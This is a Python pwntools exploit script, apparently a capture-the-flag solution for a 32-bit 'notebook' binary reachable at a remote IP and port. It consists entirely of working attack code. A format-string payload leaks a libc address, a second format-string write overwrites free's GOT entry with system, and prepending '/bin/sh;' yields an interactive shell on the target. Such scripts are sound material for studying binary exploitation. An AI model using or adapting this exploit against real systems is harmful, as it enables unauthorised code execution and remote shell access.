from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./notebook")
	libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
	elf = ELF("./notebook")
else:
	p = remote("111.198.29.45","32571")
	libc = ELF("./libc6-i386_2.23-0ubuntu10_amd64.so")
	elf = ELF("./notebook")

def debugf():
	gdb.attach(p,"b *0x08048960\nb printf\nb sprintf")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
debugf()
payload1 = "%2$p%1c%1c%2c"
p.sendlineafter("May I have your name?\n",payload1)
leak_addr = int(p.recv(10),16)
libc.address = leak_addr - 197 - libc.symbols["malloc"]
log.success("libc_base:" + hex(libc.address))
payload2 = "/bin/sh;"
payload2 += fmtstr_payload(0x19 - 2,{elf.got["free"]:libc.symbols["system"]},numbwritten = len(payload2))
p.sendlineafter("something on the notebook?\n",payload2)
p.interactive()
